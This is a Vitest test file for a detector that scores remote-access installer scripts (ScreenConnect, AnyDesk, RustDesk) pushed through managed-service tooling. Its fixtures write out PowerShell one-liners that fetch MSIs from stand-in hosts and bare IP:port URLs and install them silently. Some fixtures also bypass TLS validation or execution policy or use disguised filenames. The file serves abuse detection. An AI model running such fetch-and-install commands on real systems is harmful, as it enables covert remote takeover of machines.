import { describe, it, expect, afterEach, vi } from 'vitest';
import {
  computeScriptSignals,
  extractHosts,
  loadScriptIndicators,
  type ScriptFinding,
  type ScriptIndicators,
} from './scriptContent';
import { SIGNAL_DEFAULTS } from './config';
import type { ComputedSignal } from './types';

// All fixture data below is invented (reserved .test/.example TLDs and
// RFC 5737 documentation IP ranges) — never real tenants, hosts, or IPs.

const cfg = SIGNAL_DEFAULTS;
const noIndicators: ScriptIndicators = { tlds: [], hosts: [] };
const noShared = new Map<string, number>();

function finding(overrides: Partial<ScriptFinding>): ScriptFinding {
  return {
    partnerId: 'partner-fixture-a',
    partnerName: 'Acme IT Services',
    partnerEmailDomain: 'acmeit.example',
    scriptId: 'script-fixture-1',
    scriptContent: '',
    executionStdouts: [],
    persistedHosts: [],
    ...overrides,
  };
}

function installerSignal(signals: ComputedSignal[], partnerId = 'partner-fixture-a'): ComputedSignal | undefined {
  return signals.find((s) => s.signalKey === 'rmm.remote_access_installer' && s.partnerId === partnerId);
}

describe('computeScriptSignals — positives', () => {
  it('gate + TLS validation bypass scores >= 90 (alert)', () => {
    const f = finding({
      scriptContent: [
        '$wc = New-Object System.Net.WebClient',
        '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }',
        '$wc.DownloadFile("https://acmeit.screenconnect.test/Bin/ScreenConnect.ClientSetup.msi", "ScreenConnect.msi")',
        'msiexec /i ScreenConnect.msi /qn',
      ].join('\n'),
    });
    const signals = computeScriptSignals([f], noShared, cfg, noIndicators);
    const s = installerSignal(signals);
    expect(s).toBeDefined();
    expect(s!.score).toBeGreaterThanOrEqual(90);
    expect(s!.severity).toBe('alert');
    expect(s!.evidence.markers).toContain('tls_bypass');
    // Evidence stays compact: no script bodies.
    expect(JSON.stringify(s!.evidence)).not.toContain('DownloadFile');
  });

  it('gate + throwaway TLD (injected list) + misleading filename clamps at 100', () => {
    const indicators: ScriptIndicators = { tlds: ['testtld'], hosts: [] };
    const f = finding({
      scriptContent: [
        '# deploy anydesk for remote support',
        'Invoke-WebRequest -Uri "https://cdn.dl-fixture.testtld/pkg/agentfile" -OutFile "PhotoViewer.msi"',
        'msiexec /i PhotoViewer.msi /quiet',
      ].join('\n'),
    });
    const signals = computeScriptSignals([f], noShared, cfg, indicators);
    const s = installerSignal(signals);
    expect(s).toBeDefined();
    expect(s!.score).toBe(100);
    expect(s!.severity).toBe('alert');
    expect(s!.evidence.markers).toContain('throwaway_tld');
    expect(s!.evidence.markers).toContain('misleading_filename');
  });

  it('gate + bare IP:port URL + -ExecutionPolicy Bypass reaches alert', () => {
    const f = finding({
      scriptContent:
        'powershell -ExecutionPolicy Bypass -Command "iwr http://192.0.2.10:8040/rustdesk-host.msi -OutFile rustdesk.msi; msiexec /i rustdesk.msi /VERYSILENT"',
    });
    const signals = computeScriptSignals([f], noShared, cfg, noIndicators);
    const s = installerSignal(signals);
    expect(s).toBeDefined();
    expect(s!.score).toBe(90);
    expect(s!.severity).toBe('alert');
    expect(s!.evidence.markers).toEqual(expect.arrayContaining(['bare_ip_port', 'exec_policy_bypass']));
  });

  it('scores a host that appears ONLY in execution stdout (execution path)', () => {
    const f = finding({
      scriptContent: 'Write-Output "Deploying AnyDesk"\nmsiexec /qn /i $installer',
      executionStdouts: ['Downloading http://192.0.2.55:9001/pkg.msi ...\nInstall complete'],
    });
    const signals = computeScriptSignals([f], noShared, cfg, noIndicators);
    const s = installerSignal(signals);
    expect(s).toBeDefined();
    expect(s!.evidence.markers).toContain('bare_ip_port');
    expect(s!.score).toBe(70);
    expect(s!.severity).toBe('alert');
  });

  it('scores a known-bad host from the injected indicator list', () => {
    const indicators: ScriptIndicators = { tlds: [], hosts: ['bad-host.fixture.test'] };
    const f = finding({
      scriptContent: 'iwr https://bad-host.fixture.test/teamviewer_setup.msi -OutFile tv.msi; msiexec /i tv.msi /quiet',
    });
    const signals = computeScriptSignals([f], noShared, cfg, indicators);
    const s = installerSignal(signals);
    expect(s).toBeDefined();
    expect(s!.evidence.markers).toContain('indicator_host');
    expect(s!.severity).toBe('alert');
  });

  it('emits shared_installer_host for both partners on a cross-partner shared host', () => {
    const shared = new Map([['shared-dl.fixture-host.test', 2]]);
    const content =
      'Invoke-WebRequest https://shared-dl.fixture-host.test/agent.msi -OutFile sc.msi; msiexec /i sc.msi /qn # ScreenConnect';
    const a = finding({ scriptContent: content });
    const b = finding({
      partnerId: 'partner-fixture-b',
      partnerName: 'Beta Managed Fixture',
      partnerEmailDomain: 'betamanaged.example',
      scriptId: 'script-fixture-2',
      scriptContent: content,
    });
    const signals = computeScriptSignals([a, b], shared, cfg, noIndicators);

    for (const partnerId of ['partner-fixture-a', 'partner-fixture-b']) {
      const sharedSignal = signals.find(
        (s) => s.signalKey === 'rmm.shared_installer_host' && s.partnerId === partnerId,
      );
      expect(sharedSignal).toBeDefined();
      expect(sharedSignal!.score).toBe(60);
      expect(sharedSignal!.severity).toBe('watch');
      expect(sharedSignal!.evidence.host).toBe('shared-dl.fixture-host.test');

      const installer = installerSignal(signals, partnerId);
      expect(installer).toBeDefined();
      expect(installer!.evidence.markers).toContain('shared_host');
      expect(installer!.severity).toBe('alert');
    }
  });

  it('takes the MAX across a partner\'s scripts (one installer signal per partner)', () => {
    const benign = finding({
      scriptId: 'script-fixture-benign',
      scriptContent: 'iwr https://acmeit.screenconnect.test/Bin/x.msi -OutFile ScreenConnect.msi; msiexec /i ScreenConnect.msi /qn',
    });
    const bad = finding({
      scriptId: 'script-fixture-bad',
      scriptContent:
        'ServerCertificateValidationCallback\niwr https://acmeit.screenconnect.test/Bin/x.msi -OutFile ScreenConnect.msi; msiexec /i ScreenConnect.msi /qn',
    });
    const signals = computeScriptSignals([benign, bad], noShared, cfg, noIndicators);
    const installers = signals.filter((s) => s.signalKey === 'rmm.remote_access_installer');
    expect(installers).toHaveLength(1);
    expect(installers[0]!.score).toBe(90);
    expect(installers[0]!.evidence.scriptId).toBe('script-fixture-bad');
  });
});

describe('computeScriptSignals — negatives (must not reach alert)', () => {
  it('own vendor instance install scores exactly the gate (20)', () => {
    const f = finding({
      scriptContent:
        'Invoke-WebRequest "https://acmeit.screenconnect.test/Bin/ScreenConnect.ClientSetup.msi" -OutFile ScreenConnect.ClientSetup.msi\nmsiexec /i ScreenConnect.ClientSetup.msi /qn',
    });
    const signals = computeScriptSignals([f], noShared, cfg, noIndicators);
    const s = installerSignal(signals);
    expect(s).toBeDefined();
    expect(s!.score).toBe(20);
    expect(s!.severity).toBe('info');
  });

  it('vendor-domain silent install scores exactly the gate (20)', () => {
    const f = finding({
      scriptContent: 'iwr https://dl.screenconnect.test/latest/setup.msi -OutFile setup.msi; msiexec /i setup.msi /quiet',
    });
    const signals = computeScriptSignals([f], noShared, cfg, noIndicators);
    const s = installerSignal(signals);
    expect(s).toBeDefined();
    expect(s!.score).toBe(20);
    expect(s!.severity).toBe('info');
  });

  it('own instance + unattended-access params stays at 35 (info)', () => {
    const f = finding({
      scriptContent:
        'iwr "https://acmeit.screenconnect.test/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest" -OutFile ScreenConnect.msi; msiexec /i ScreenConnect.msi /qn',
    });
    const signals = computeScriptSignals([f], noShared, cfg, noIndicators);
    const s = installerSignal(signals);
    expect(s).toBeDefined();
    expect(s!.score).toBe(35);
    expect(s!.severity).toBe('info');
  });

  it('foreign vendor-instance host + unattended + unrelated partner name is watch (60), not alert', () => {
    const f = finding({
      partnerName: 'Zenith Networks Fixture',
      partnerEmailDomain: 'zenithnetworks.example',
      scriptContent:
        'iwr "https://brightpath.screenconnect.test/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest" -OutFile ScreenConnect.msi; msiexec /i ScreenConnect.msi /qn',
    });
    const signals = computeScriptSignals([f], noShared, cfg, noIndicators);
    const s = installerSignal(signals);
    expect(s).toBeDefined();
    expect(s!.score).toBe(60);
    expect(s!.severity).toBe('watch');
    expect(s!.evidence.markers).toEqual(expect.arrayContaining(['unrelated_host', 'unattended_params']));
  });

  it('a non-remote-access install script produces no signal at all', () => {
    const f = finding({
      scriptContent: 'winget install --silent FixtureVendor.NotesApp\nchoco install fixture-notes -y',
    });
    expect(computeScriptSignals([f], noShared, cfg, noIndicators)).toEqual([]);
  });

  it('a quiet fleet emits nothing', () => {
    expect(computeScriptSignals([], noShared, cfg, noIndicators)).toEqual([]);
  });
});

describe('extractHosts', () => {
  it('extracts lowercased authorities (with port) and strips userinfo and trailing punctuation', () => {
    const hosts = extractHosts(
      'See HTTPS://User:Pw@Dl.Fixture-Host.TEST:8443/path and http://192.0.2.7:9001/x. Done.',
    );
    expect(hosts).toEqual(expect.arrayContaining(['dl.fixture-host.test:8443', '192.0.2.7:9001']));
  });

  it('returns nothing for text without URLs', () => {
    expect(extractHosts('no urls here')).toEqual([]);
  });
});

describe('loadScriptIndicators', () => {
  afterEach(() => {
    delete process.env.ABUSE_SCRIPT_INDICATORS;
    vi.restoreAllMocks();
  });

  it('defaults to EMPTY lists when unset (repo ships no indicators)', () => {
    expect(loadScriptIndicators()).toEqual({ tlds: [], hosts: [] });
  });

  it('parses tlds and hosts, lowercased', () => {
    process.env.ABUSE_SCRIPT_INDICATORS = '{"tlds": ["TESTTLD"], "hosts": ["Bad-Host.Fixture.TEST"]}';
    expect(loadScriptIndicators()).toEqual({ tlds: ['testtld'], hosts: ['bad-host.fixture.test'] });
  });

  it('warns and returns empty lists on malformed JSON', () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    process.env.ABUSE_SCRIPT_INDICATORS = '{not json';
    expect(loadScriptIndicators()).toEqual({ tlds: [], hosts: [] });
    expect(warn).toHaveBeenCalled();
  });

  it('warns and returns empty lists on non-object JSON', () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    process.env.ABUSE_SCRIPT_INDICATORS = '["nope"]';
    expect(loadScriptIndicators()).toEqual({ tlds: [], hosts: [] });
    expect(warn).toHaveBeenCalled();
  });

  it('ignores non-string entries', () => {
    process.env.ABUSE_SCRIPT_INDICATORS = '{"tlds": [1, "testtld", null], "hosts": "not-a-list"}';
    expect(loadScriptIndicators()).toEqual({ tlds: ['testtld'], hosts: [] });
  });
});
